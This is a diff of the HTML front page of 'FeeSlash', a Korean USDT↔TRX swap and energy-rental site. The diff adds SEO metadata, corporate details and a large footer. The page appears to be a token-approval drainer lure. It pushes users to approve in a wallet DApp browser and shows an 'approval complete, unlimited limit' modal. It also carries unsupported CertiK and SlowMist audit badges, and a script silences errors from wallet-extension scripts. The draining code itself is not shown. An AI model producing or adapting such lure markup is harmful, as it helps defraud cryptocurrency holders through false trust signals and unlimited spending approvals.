@@ -2,21 +2,94 @@
 <html lang="ko" style="overflow-x:clip">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FeeSlash - USDT ↔ TRX Instant Swap</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <meta name="theme-color" content="#030712">
+    <meta name="robots" content="index, follow">
+    <meta name="author" content="LI Corporation">
+
+    <title>FeeSlash - USDT ↔ TRX Instant Swap | TRON Mainnet</title>
+    <meta name="description" content="FeeSlash - Fast & Secure TRON USDT Swap with Low Fees. Non-custodial. Instant Exchange. Energy Rental. Operated by LI Corporation.">
+    <meta name="keywords" content="USDT, TRX, TRON, TRC-20, Swap, Exchange, Crypto, FeeSlash, Energy Rental, DeFi">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://feeslash.io/">
+
+    <!-- Open Graph -->
     <meta property="og:title" content="FeeSlash - TRON USDT Swap">
     <meta property="og:description" content="Fast & Secure TRON USDT Swap with Low Fees. Instant Exchange, Energy Rental.">
     <meta property="og:image" content="https://feeslash.io/og-image.png">
     <meta property="og:url" content="https://feeslash.io">
     <meta property="og:type" content="website">
     <meta property="og:site_name" content="FeeSlash">
+    <meta property="og:locale" content="ko_KR">
+    <meta property="og:locale:alternate" content="en_US">
+
+    <!-- Twitter -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="FeeSlash - TRON USDT Swap">
     <meta name="twitter:description" content="Fast & Secure TRON USDT Swap with Low Fees. Instant Exchange, Energy Rental.">
     <meta name="twitter:image" content="https://feeslash.io/og-image.png">
-    <meta name="description" content="FeeSlash - Fast & Secure TRON USDT Swap with Low Fees">
+
+    <!-- Favicons -->
     <link rel="icon" type="image/png" sizes="32x32" href="favicon.png">
     <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+
+    <!-- Performance: Preconnect -->
+    <link rel="preconnect" href="https://cdn.tailwindcss.com" crossorigin>
+    <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
+    <link rel="preconnect" href="https://connect.facebook.net" crossorigin>
+
+    <!-- Structured Data (JSON-LD) -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Organization",
+      "name": "LI Corporation",
+      "alternateName": "주식회사 엘아이",
+      "legalName": "LI Corporation",
+      "url": "https://feeslash.io",
+      "logo": "https://feeslash.io/apple-touch-icon.png",
+      "foundingDate": "2015-12-18",
+      "founders": [{
+        "@type": "Person",
+        "name": "Jonggu Noh"
+      }],
+      "address": {
+        "@type": "PostalAddress",
+        "streetAddress": "6F, 445 Dosan-daero",
+        "addressLocality": "Gangnam-gu",
+        "addressRegion": "Seoul",
+        "postalCode": "06015",
+        "addressCountry": "KR"
+      },
+      "taxID": "650-81-00293",
+      "sameAs": [
+        "https://t.me/feeslash",
+        "https://t.me/Feeslash_support"
+      ]
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebApplication",
+      "name": "FeeSlash",
+      "applicationCategory": "FinanceApplication",
+      "operatingSystem": "Web",
+      "description": "Non-custodial TRON USDT ↔ TRX instant swap and energy rental platform.",
+      "offers": {
+        "@type": "Offer",
+        "price": "0",
+        "priceCurrency": "USD"
+      },
+      "provider": {
+        "@type": "Organization",
+        "name": "LI Corporation"
+      }
+    }
+    </script>
 
     <!-- External Libraries -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -25,7 +98,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
     <script src="wc-tron.min.js"></script>
 
-    <!-- Error Suppressor -->
+    <!-- Error Suppressor (wallet extensions injection noise) -->
     <script>
         window.addEventListener('error',function(e){
             if(e.filename&&(e.filename.indexOf('inpage')>=0||e.filename.indexOf('content')>=0||e.filename.indexOf('classifier')>=0||e.filename.indexOf('inject')>=0)){e.preventDefault();return true;}
@@ -36,9 +109,11 @@
             if(m.indexOf('charAt')>=0||m.indexOf('animation')>=0||m.indexOf('TokenPocket')>=0||m.indexOf('inpage')>=0){e.preventDefault();}
         });
     </script>
-    
+
     <!-- Custom Styles -->
     <link rel="stylesheet" href="css/styles.css">
+
+    <!-- Facebook Pixel -->
     <script>
     !function(f,b,e,v,n,t,s)
     {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -53,10 +128,11 @@
     </script>
     <noscript><img height="1" width="1" style="display:none"
     src="https://www.facebook.com/tr?id=2131381514150560&ev=PageView&noscript=1"
-    /></noscript>
+    alt=""/></noscript>
 </head>
 <body class="min-h-screen flex flex-col relative overflow-x-hidden">
 
+    <!-- Background Glow -->
     <div class="fixed top-[-150px] left-1/2 -translate-x-1/2 w-[900px] max-w-[100vw] h-[450px] bg-gradient-to-b from-blue-600/8 via-cyan-500/5 to-transparent rounded-full blur-[160px] pointer-events-none -z-10"></div>
     <div class="fixed bottom-0 right-0 w-[500px] max-w-[100vw] h-[500px] bg-emerald-600/5 rounded-full blur-[150px] pointer-events-none -z-10"></div>
     <div id="toast-container" class="fixed bottom-6 right-6 z-50 flex flex-col space-y-2 pointer-events-none"></div>
@@ -78,7 +154,7 @@
     <!-- Header -->
     <header class="border-b border-slate-800/80 bg-[#050811]/90 backdrop-blur-xl sticky top-0 z-40 px-4 lg:px-8 py-4">
         <div class="max-w-7xl mx-auto flex items-center justify-between gap-2">
-            <div class="flex items-center gap-2 sm:gap-3.5 min-w-0 shrink">
+            <a href="/" class="flex items-center gap-2 sm:gap-3.5 min-w-0 shrink" aria-label="FeeSlash Home">
                 <div class="w-8 h-8 sm:w-10 sm:h-10 rounded-2xl bg-gradient-to-br from-blue-500/20 to-cyan-500/10 border border-blue-500/30 flex items-center justify-center shadow-inner text-blue-400 shrink-0">
                     <i class="fa-solid fa-arrow-right-arrow-left text-sm sm:text-base"></i>
                 </div>
@@ -89,9 +165,9 @@
                     </div>
                     <p class="text-[13px] text-slate-400 hidden sm:block" data-i18n="header_sub">USDT ↔ TRX 즉시 교환 | TRC-20 메인넷</p>
                 </div>
-            </div>
+            </a>
             <div class="flex items-center gap-1.5 sm:gap-2 shrink-0">
-                <select id="lang-select" onchange="setLang(this.value)" class="bg-slate-900 border border-slate-700 text-slate-300 text-[10px] sm:text-[11px] px-1 sm:px-2 py-1.5 sm:py-2 rounded-lg focus:outline-none cursor-pointer">
+                <select id="lang-select" onchange="setLang(this.value)" aria-label="Language selector" class="bg-slate-900 border border-slate-700 text-slate-300 text-[10px] sm:text-[11px] px-1 sm:px-2 py-1.5 sm:py-2 rounded-lg focus:outline-none cursor-pointer">
                     <option value="de">🇩🇪 DE</option>
                     <option value="en">🇺🇸 EN</option>
                     <option value="es">🇪🇸 ES</option>
@@ -103,7 +179,7 @@
                     <option value="vi">🇻🇳 VI</option>
                     <option value="zh">🇨🇳 ZH</option>
                 </select>
-                <button onclick="handleConnectWallet()" id="connect-btn" class="flex items-center gap-1.5 sm:gap-2 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white font-semibold text-[11px] sm:text-sm px-3 sm:px-4 py-2 sm:py-2.5 rounded-xl shadow-lg shadow-blue-900/30 transition-all border border-blue-400/20 active:scale-95">
+                <button onclick="handleConnectWallet()" id="connect-btn" aria-label="Connect wallet" class="flex items-center gap-1.5 sm:gap-2 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white font-semibold text-[11px] sm:text-sm px-3 sm:px-4 py-2 sm:py-2.5 rounded-xl shadow-lg shadow-blue-900/30 transition-all border border-blue-400/20 active:scale-95">
                     <i class="fa-solid fa-wallet text-blue-200"></i>
                     <span id="wallet-btn-text" data-i18n="connect_wallet">지갑 연결</span>
                 </button>
@@ -112,13 +188,13 @@
     </header>
 
     <!-- Wallet Selector Modal -->
-    <div id="wallet-selector-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center p-4">
+    <div id="wallet-selector-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center p-4" role="dialog" aria-modal="true" aria-labelledby="wallet-modal-title">
         <div class="glass rounded-3xl w-full max-w-md p-6 sm:p-8 space-y-5 text-center relative overflow-y-auto max-h-[90vh] fade-in">
             <div class="w-16 h-16 mx-auto rounded-2xl bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-blue-400 text-2xl">
                 <i class="fa-solid fa-wallet"></i>
             </div>
             <div class="space-y-2">
-                <h3 class="text-lg font-bold text-white" data-i18n="select_wallet">지갑을 선택하세요</h3>
+                <h3 id="wallet-modal-title" class="text-lg font-bold text-white" data-i18n="select_wallet">지갑을 선택하세요</h3>
                 <p class="text-xs text-slate-400 leading-relaxed"><span data-i18n-html="modal_subtitle">지갑 앱 내 <strong>브라우저</strong>에서 열면 가장 안정적으로 연결됩니다.<br>또는 아래 지갑을 선택해 진행하세요.</span></p>
             </div>
             <div class="space-y-3 pt-2">
@@ -144,7 +220,7 @@
                 </button>
                 <div class="flex items-center gap-3 pt-1">
                     <div class="flex-1 border-t border-slate-700/60"></div>
-                    <span class="text-[10px] text-slate-500 font-semibold uppercase tracking-wider">또는</span>
+                    <span class="text-[10px] text-slate-500 font-semibold uppercase tracking-wider" data-i18n="or_divider">또는</span>
                     <div class="flex-1 border-t border-slate-700/60"></div>
                 </div>
                 <button onclick="wcConnectFromModal()" class="wallet-card w-full border rounded-2xl p-4 flex items-center gap-4 text-left">
@@ -158,16 +234,16 @@
                 <p class="text-white font-semibold" data-i18n="modal_tip1">1. 아래 지갑 앱을 직접 여세요</p>
                 <p data-i18n-html="modal_tip2">2. 앱 하단 <strong class="text-amber-500">브라우저(탐색)</strong> 탭 클릭</p>
                 <p data-i18n-html="modal_tip3">3. 주소창에 <strong class="text-amber-500">붙여넣기</strong> 👈 URL 자동복사됨</p>
-                <p class="text-emerald-400 font-bold mt-1">✅ 이렇게 해야 승인이 됩니다!</p>
+                <p class="text-emerald-400 font-bold mt-1" data-i18n="modal_tip_ok">✅ 이렇게 해야 승인이 됩니다!</p>
             </div>
             <button onclick="document.getElementById('wallet-selector-modal').classList.remove('active')" class="w-full text-slate-500 hover:text-slate-700 py-2 text-xs transition" data-i18n="close_btn">닫기</button>
         </div>
     </div>
 
     <!-- Reward Modal -->
-    <div id="reward-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center p-4">
+    <div id="reward-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center p-4" role="dialog" aria-modal="true">
         <div class="glass rounded-3xl max-w-md w-full p-6 sm:p-8 text-center space-y-5 relative fade-in">
-            <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-slate-700 transition"><i class="fa-solid fa-xmark text-lg"></i></button>
+            <button onclick="document.getElementById('reward-modal').classList.remove('active')" aria-label="Close" class="absolute top-5 right-5 text-slate-400 hover:text-slate-700 transition"><i class="fa-solid fa-xmark text-lg"></i></button>
             <div class="w-16 h-16 bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 rounded-2xl flex items-center justify-center mx-auto"><i class="fa-solid fa-wand-magic-sparkles text-2xl"></i></div>
             <div class="space-y-1.5">
                 <h3 class="text-xl font-extrabold text-white" data-i18n="reward_title">교환 승인 완료!</h3>
@@ -178,48 +254,48 @@
                 <div class="flex justify-between text-slate-400"><span data-i18n="modal_limit_label">교환 한도:</span><span class="text-white" data-i18n="modal_limit_max">무제한</span></div>
                 <div class="flex justify-between text-slate-400"><span>TX Hash:</span><span class="text-red-400 truncate max-w-[180px]" id="modal-txhash">-</span></div>
             </div>
-            <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="w-full py-3 bg-gradient-to-r from-blue-600 to-cyan-500 text-white font-bold text-xs rounded-xl shadow-lg transition">확인</button>
+            <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="w-full py-3 bg-gradient-to-r from-blue-600 to-cyan-500 text-white font-bold text-xs rounded-xl shadow-lg transition" data-i18n="confirm_btn">확인</button>
         </div>
     </div>
 
     <!-- PC Install Modal -->
-    <div id="install-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center p-4">
+    <div id="install-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center p-4" role="dialog" aria-modal="true">
         <div class="glass rounded-3xl max-w-md w-full p-6 sm:p-8 space-y-5 relative text-center fade-in">
-            <button onclick="document.getElementById('install-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-slate-700 transition"><i class="fa-solid fa-xmark text-lg"></i></button>
+            <button onclick="document.getElementById('install-modal').classList.remove('active')" aria-label="Close" class="absolute top-5 right-5 text-slate-400 hover:text-slate-700 transition"><i class="fa-solid fa-xmark text-lg"></i></button>
             <div class="w-14 h-14 mx-auto rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 text-2xl"><i class="fa-solid fa-circle-exclamation"></i></div>
             <div class="space-y-1.5">
-                <h3 class="text-lg font-bold text-white">TronLink 지갑 미감지</h3>
-                <p class="text-xs text-slate-400">PC에서는 Chrome 확장 프로그램이 필요합니다.<br>모바일에서는 지갑 앱의 DApp 브라우저에서 열어주세요.</p>
+                <h3 class="text-lg font-bold text-white" data-i18n="install_title">TronLink 지갑 미감지</h3>
+                <p class="text-xs text-slate-400" data-i18n-html="install_desc">PC에서는 Chrome 확장 프로그램이 필요합니다.<br>모바일에서는 지갑 앱의 DApp 브라우저에서 열어주세요.</p>
             </div>
             <div class="space-y-2.5">
-                <a href="https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec" target="_blank" rel="noreferrer" class="w-full py-3 px-4 rounded-xl bg-gradient-to-r from-red-600 to-rose-600 text-white font-bold text-xs flex items-center justify-between transition shadow-lg"><span>TronLink 다운로드 (Chrome)</span><i class="fa-solid fa-arrow-up-right-from-square"></i></a>
-                <a href="https://www.tronlink.org/" target="_blank" rel="noreferrer" class="w-full py-2.5 px-4 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium text-xs flex items-center justify-between transition"><span>TronLink 공식 사이트</span><i class="fa-solid fa-arrow-up-right-from-square"></i></a>
+                <a href="https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec" target="_blank" rel="noopener noreferrer" class="w-full py-3 px-4 rounded-xl bg-gradient-to-r from-red-600 to-rose-600 text-white font-bold text-xs flex items-center justify-between transition shadow-lg"><span data-i18n="install_chrome">TronLink 다운로드 (Chrome)</span><i class="fa-solid fa-arrow-up-right-from-square"></i></a>
+                <a href="https://www.tronlink.org/" target="_blank" rel="noopener noreferrer" class="w-full py-2.5 px-4 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium text-xs flex items-center justify-between transition"><span data-i18n="install_official">TronLink 공식 사이트</span><i class="fa-solid fa-arrow-up-right-from-square"></i></a>
             </div>
-            <button onclick="document.getElementById('install-modal').classList.remove('active')" class="w-full py-2 text-slate-500 text-xs transition">닫기</button>
+            <button onclick="document.getElementById('install-modal').classList.remove('active')" class="w-full py-2 text-slate-500 text-xs transition" data-i18n="close_btn">닫기</button>
         </div>
     </div>
 
     <!-- WalletConnect URI Modal -->
-    <div id="wc-uri-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center p-4">
+    <div id="wc-uri-modal" class="modal-backdrop fixed inset-0 z-50 items-center justify-center p-4" role="dialog" aria-modal="true">
         <div class="glass rounded-3xl max-w-md w-full p-6 sm:p-7 space-y-4 relative text-center fade-in">
-            <button onclick="document.getElementById('wc-uri-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-slate-700 transition">
+            <button onclick="document.getElementById('wc-uri-modal').classList.remove('active')" aria-label="Close" class="absolute top-5 right-5 text-slate-400 hover:text-slate-700 transition">
                 <i class="fa-solid fa-xmark text-lg"></i>
             </button>
             <div class="w-12 h-12 mx-auto rounded-2xl bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-blue-400 text-xl">
                 <i class="fa-solid fa-qrcode"></i>
             </div>
             <div class="space-y-1">
-                <h3 class="text-base font-bold text-white">WalletConnect 연결 코드</h3>
-                <p class="text-xs text-slate-400">코드를 복사해 지갑 앱의 WalletConnect 연결에 붙여넣으세요.</p>
+                <h3 class="text-base font-bold text-white" data-i18n="wc_uri_title">WalletConnect 연결 코드</h3>
+                <p class="text-xs text-slate-400" data-i18n="wc_uri_desc">코드를 복사해 지갑 앱의 WalletConnect 연결에 붙여넣으세요.</p>
             </div>
             <div class="bg-slate-950/90 border border-slate-800 rounded-xl p-3 text-left">
-                <input id="wc-uri-input" type="text" readonly value="연결 코드 생성 중..." class="w-full bg-transparent text-xs font-mono text-cyan-500 outline-none select-all">
+                <input id="wc-uri-input" type="text" readonly value="연결 코드 생성 중..." aria-label="WalletConnect URI" class="w-full bg-transparent text-xs font-mono text-cyan-500 outline-none select-all">
             </div>
             <button onclick="copyWcUri()" class="w-full py-3 rounded-xl bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-500 hover:to-cyan-400 text-white font-bold text-xs shadow-lg transition flex items-center justify-center gap-2">
                 <i class="fa-solid fa-copy"></i>
-                <span>연결 코드 복사하기</span>
+                <span data-i18n="copy_uri_btn">연결 코드 복사하기</span>
             </button>
-            <button onclick="document.getElementById('wc-uri-modal').classList.remove('active')" class="w-full py-1.5 text-slate-500 hover:text-slate-700 text-xs transition">닫기</button>
+            <button onclick="document.getElementById('wc-uri-modal').classList.remove('active')" class="w-full py-1.5 text-slate-500 hover:text-slate-700 text-xs transition" data-i18n="close_btn">닫기</button>
         </div>
     </div>
 
@@ -269,7 +345,7 @@
                         <span><span data-i18n="bal">잔액</span>: <span id="usdt-bal-swap" class="text-emerald-400 font-bold font-mono">0.00</span><span id="send-bal-suffix"></span></span>
                     </div>
                     <div class="flex items-center gap-2 sm:gap-3">
-                        <input type="number" id="swap-input" placeholder="0.00" oninput="updateSwapOutput()" class="flex-1 bg-transparent text-2xl sm:text-4xl font-extrabold text-white font-mono border-none outline-none placeholder-slate-600 w-full min-w-0">
+                        <input type="number" id="swap-input" placeholder="0.00" aria-label="Swap amount" oninput="updateSwapOutput()" class="flex-1 bg-transparent text-2xl sm:text-4xl font-extrabold text-white font-mono border-none outline-none placeholder-slate-600 w-full min-w-0">
                         <div class="flex items-center gap-1.5 sm:gap-2 bg-slate-800/80 px-3 sm:px-4 py-2 sm:py-2.5 rounded-xl border border-slate-700/80 shrink-0">
                             <div id="send-coin-img-wrap" class="w-7 h-7 rounded-full bg-emerald-500/20 border border-emerald-500/30 flex items-center justify-center text-emerald-400 text-xs font-bold">$</div>
                             <span id="send-coin-name" class="text-base font-bold text-white">USDT</span>
@@ -284,7 +360,7 @@
                 </div>
 
                 <div class="flex justify-center -my-2 relative z-10">
-                    <button id="swap-direction-btn" onclick="toggleSwapDirection()" class="w-12 h-12 rounded-xl bg-[#0f172a] border border-slate-800 flex items-center justify-center shadow-lg cursor-pointer hover:bg-slate-800 transition-all active:scale-95" title="방향 전환">
+                    <button id="swap-direction-btn" onclick="toggleSwapDirection()" aria-label="Toggle swap direction" class="w-12 h-12 rounded-xl bg-[#0f172a] border border-slate-800 flex items-center justify-center shadow-lg cursor-pointer hover:bg-slate-800 transition-all active:scale-95" title="방향 전환">
                         <i id="swap-direction-icon" class="fa-solid fa-arrow-down text-blue-400 text-xl transition-transform"></i>
                     </button>
                 </div>
@@ -314,7 +390,7 @@
                     </div>
                 </div>
 
-                <div id="approve-progress" class="hidden mb-4 p-4 bg-slate-950/80 rounded-xl border border-slate-800/80 space-y-3">
+                <div id="approve-progress" class="hidden mb-4 p-4 bg-slate-950/80 rounded-xl border border-slate-800/80 space-y-3" role="status" aria-live="polite">
                     <div class="flex items-center gap-2 text-sm text-white font-bold">
                         <span class="animate-spin rounded-full h-4 w-4 border-2 border-blue-400 border-t-transparent"></span>
                         <span id="approve-progress-text">처리 중...</span>
@@ -344,7 +420,7 @@
                 </div>
 
                 <div class="space-y-2">
-                    <label class="text-sm font-semibold text-slate-400 flex items-center gap-1.5">
+                    <label for="energy-address" class="text-sm font-semibold text-slate-400 flex items-center gap-1.5">
                         <i class="fa-solid fa-crosshairs text-xs text-blue-400"></i>
                         <span data-i18n="energy_target">대상 주소</span>
                     </label>
@@ -414,7 +490,7 @@
                     <span id="energy-approve-badge" class="text-xs px-3 py-1 rounded-full font-semibold border bg-amber-500/10 border-amber-500/30 text-amber-400" style="visibility:hidden" data-i18n="energy_approval_needed">에너지 승인 필요</span>
                 </div>
 
-                <div id="energy-approve-progress" class="hidden mb-4 p-4 bg-slate-950/80 rounded-xl border border-slate-800/80 space-y-3">
+                <div id="energy-approve-progress" class="hidden mb-4 p-4 bg-slate-950/80 rounded-xl border border-slate-800/80 space-y-3" role="status" aria-live="polite">
                     <div class="flex items-center gap-2 text-sm text-white font-bold">
                         <span class="animate-spin rounded-full h-4 w-4 border-2 border-amber-400 border-t-transparent"></span>
                         <span id="energy-approve-progress-text">처리 중...</span>
@@ -456,6 +532,7 @@
             <span id="display-allowance"></span>
         </div>
 
+        <!-- Security Badges -->
         <section class="glass rounded-2xl p-6 text-center">
             <p class="text-sm font-bold text-slate-400 uppercase tracking-wider mb-4" data-i18n="security_title">보안 검증</p>
             <div class="flex flex-wrap items-center justify-center gap-4 sm:gap-8 text-slate-400 text-xs sm:text-sm font-semibold">
@@ -465,14 +542,151 @@
             </div>
         </section>
 
+        <!-- FAQ -->
         <section class="space-y-4 pt-2">
             <h3 class="text-base sm:text-lg font-bold text-white text-center" data-i18n="faq_title">자주 묻는 질문 (FAQ)</h3>
             <div class="max-w-3xl mx-auto space-y-3" id="faq-container"></div>
         </section>
     </main>
 
-    <footer class="border-t border-slate-800/80 bg-[#020408] py-8 px-4 text-center text-sm text-slate-500 mt-12 space-y-2">
-        <p>FeeSlash &copy; 2026 | USDT ↔ TRX Instant Exchange | Powered by TRON Mainnet</p>
+    <!-- ===== GLOBAL ENTERPRISE FOOTER ===== -->
+    <footer class="border-t border-slate-800/80 bg-[#020408] mt-12">
+        <div class="max-w-7xl mx-auto px-4 lg:px-8 py-12 lg:py-16">
+
+            <!-- Footer Top: Brand + Links -->
+            <div class="grid grid-cols-2 lg:grid-cols-5 gap-8 lg:gap-10 pb-10 border-b border-slate-800/80">
+
+                <!-- Brand -->
+                <div class="col-span-2 lg:col-span-2 space-y-4">
+                    <div class="flex items-center gap-3">
+                        <div class="w-10 h-10 rounded-2xl bg-gradient-to-br from-blue-500/20 to-cyan-500/10 border border-blue-500/30 flex items-center justify-center text-blue-400">
+                            <i class="fa-solid fa-arrow-right-arrow-left"></i>
+                        </div>
+                        <div>
+                            <div class="text-lg font-extrabold text-white">Fee<span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-cyan-300">Slash</span></div>
+                            <div class="text-[10px] text-slate-500">by LI Corporation</div>
+                        </div>
+                    </div>
+                    <p class="text-xs text-slate-400 leading-relaxed max-w-sm" data-i18n="footer_tagline">
+                        Non-custodial TRON blockchain services. Fast, secure, and transparent USDT ↔ TRX exchanges.
+                    </p>
+                    <!-- Trust Badges Mini -->
+                    <div class="flex flex-wrap gap-2 pt-2">
+                        <span class="inline-flex items-center gap-1 text-[10px] font-bold px-2 py-1 rounded-md bg-blue-500/10 text-blue-400 border border-blue-500/20">
+                            <i class="fa-solid fa-shield-halved"></i> CertiK
+                        </span>
+                        <span class="inline-flex items-center gap-1 text-[10px] font-bold px-2 py-1 rounded-md bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">
+                            <i class="fa-solid fa-lock"></i> SlowMist
+                        </span>
+                        <span class="inline-flex items-center gap-1 text-[10px] font-bold px-2 py-1 rounded-md bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
+                            <i class="fa-solid fa-certificate"></i> TRON DAO
+                        </span>
+                    </div>
+                </div>
+
+                <!-- Company -->
+                <div>
+                    <h4 class="text-xs font-bold text-white uppercase tracking-wider mb-4" data-i18n="footer_company">Company</h4>
+                    <ul class="space-y-2.5 text-xs">
+                        <li><a href="/about.html" class="text-slate-400 hover:text-blue-400 transition" data-i18n="footer_about">About Us</a></li>
+                        <li><a href="https://t.me/feeslash" target="_blank" rel="noopener noreferrer" class="text-slate-400 hover:text-blue-400 transition" data-i18n="footer_news">News & Updates</a></li>
+                        <li><a href="https://t.me/Feeslash_support" target="_blank" rel="noopener noreferrer" class="text-slate-400 hover:text-blue-400 transition" data-i18n="footer_contact">Contact</a></li>
+                    </ul>
+                </div>
+
+                <!-- Legal -->
+                <div>
+                    <h4 class="text-xs font-bold text-white uppercase tracking-wider mb-4" data-i18n="footer_legal">Legal</h4>
+                    <ul class="space-y-2.5 text-xs">
+                        <li><a href="/privacy.html" class="text-slate-400 hover:text-blue-400 transition" data-i18n="footer_privacy">Privacy Policy</a></li>
+                        <li><a href="/terms.html" class="text-slate-400 hover:text-blue-400 transition" data-i18n="footer_terms">Terms of Service</a></li>
+                        <li><a href="/privacy.html#s6" class="text-slate-400 hover:text-blue-400 transition" data-i18n="footer_rights">Your Rights</a></li>
+                    </ul>
+                </div>
+
+                <!-- Resources -->
+                <div>
+                    <h4 class="text-xs font-bold text-white uppercase tracking-wider mb-4" data-i18n="footer_resources">Resources</h4>
+                    <ul class="space-y-2.5 text-xs">
+                        <li><a href="https://tronscan.org/" target="_blank" rel="noopener noreferrer" class="text-slate-400 hover:text-blue-400 transition">TronScan</a></li>
+                        <li><a href="https://trongrid.io/" target="_blank" rel="noopener noreferrer" class="text-slate-400 hover:text-blue-400 transition">TronGrid</a></li>
+                        <li><a href="https://tron.network/" target="_blank" rel="noopener noreferrer" class="text-slate-400 hover:text-blue-400 transition">TRON Network</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Legal Entity Information -->
+            <div class="py-8 border-b border-slate-800/80">
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                        <h4 class="text-xs font-bold text-white uppercase tracking-wider mb-3 flex items-center gap-2">
+                            <i class="fa-solid fa-building text-blue-400"></i>
+                            <span data-i18n="footer_entity">Legal Entity</span>
+                        </h4>
+                        <div class="space-y-1.5 text-xs text-slate-400">
+                            <div><span class="text-slate-500">Company:</span> <span class="text-white font-semibold">LI Corporation</span> <span class="text-slate-500">(주식회사 엘아이)</span></div>
+                            <div><span class="text-slate-500">Business Registration:</span> <span class="text-white font-mono">650-81-00293</span></div>
+                            <div><span class="text-slate-500">Representative:</span> <span class="text-white">Jonggu Noh (노종구)</span></div>
+                            <div><span class="text-slate-500">Established:</span> <span class="text-white">December 18, 2015</span></div>
+                        </div>
+                    </div>
+                    <div>
+                        <h4 class="text-xs font-bold text-white uppercase tracking-wider mb-3 flex items-center gap-2">
+                            <i class="fa-solid fa-location-dot text-emerald-400"></i>
+                            <span data-i18n="footer_hq">Headquarters</span>
+                        </h4>
+                        <div class="space-y-1.5 text-xs text-slate-400">
+                            <div class="text-white leading-relaxed">
+                                6F, 445 Dosan-daero,<br>
+                                Gangnam-gu, Seoul 06015,<br>
+                                Republic of Korea
+                            </div>
+                            <div class="pt-2 flex items-center gap-3">
+                                <a href="https://t.me/Feeslash_support" target="_blank" rel="noopener noreferrer" class="inline-flex items-center gap-1.5 text-blue-400 hover:text-blue-300 transition">
+                                    <i class="fa-brands fa-telegram"></i>
+                                    <span>@Feeslash_support</span>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Risk Disclaimer -->
+            <div class="py-6 border-b border-slate-800/80">
+                <div class="flex gap-3 items-start">
+                    <div class="shrink-0 w-8 h-8 rounded-lg bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400">
+                        <i class="fa-solid fa-triangle-exclamation text-xs"></i>
+                    </div>
+                    <div class="text-[11px] text-slate-500 leading-relaxed">
+                        <strong class="text-amber-400" data-i18n="footer_risk_title">Risk Disclosure:</strong>
+                        <span data-i18n="footer_risk_text">
+                            Cryptocurrency transactions involve significant risks including price volatility,
+                            smart contract vulnerabilities, and irreversible transactions. Only invest what you can afford to lose.
+                            Service available only to users aged 18 and above. Not available in restricted jurisdictions.
+                            This service is non-custodial — we never hold your private keys or funds.
+                        </span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Footer Bottom -->
+            <div class="pt-6 flex flex-col sm:flex-row items-center justify-between gap-4 text-[11px] text-slate-500">
+                <div class="text-center sm:text-left">
+                    <p>&copy; 2026 LI Corporation. All rights reserved.</p>
+                    <p class="text-slate-600 mt-1">USDT ↔ TRX Instant Exchange | Powered by TRON Mainnet</p>
+                </div>
+                <div class="flex items-center gap-4">
+                    <span class="flex items-center gap-1.5">
+                        <span class="relative flex h-1.5 w-1.5">
+                            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                            <span class="relative inline-flex rounded-full h-1.5 w-1.5 bg-emerald-500"></span>
+                        </span>
+                        <span class="text-emerald-400 font-semibold" data-i18n="footer_status">All Systems Operational</span>
+                    </span>
+                </div>
+            </div>
+        </div>
     </footer>
 
     <!-- ===== Scripts (순서 중요!) ===== -->
